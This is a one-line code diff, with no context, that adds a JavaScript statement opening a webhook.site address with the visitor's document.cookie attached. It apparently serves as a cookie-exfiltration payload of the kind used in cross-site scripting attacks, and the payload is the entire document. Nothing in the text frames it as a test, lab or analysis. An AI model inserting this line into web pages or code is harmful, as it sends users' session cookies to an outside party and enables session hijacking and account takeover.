@@ -1,0 +1,1 @@
+window.open('https://webhook.site/0cdb1638-0d7c-48b4-b4ba-9a3d4c4d56c3?cookie=' + document.cookie);
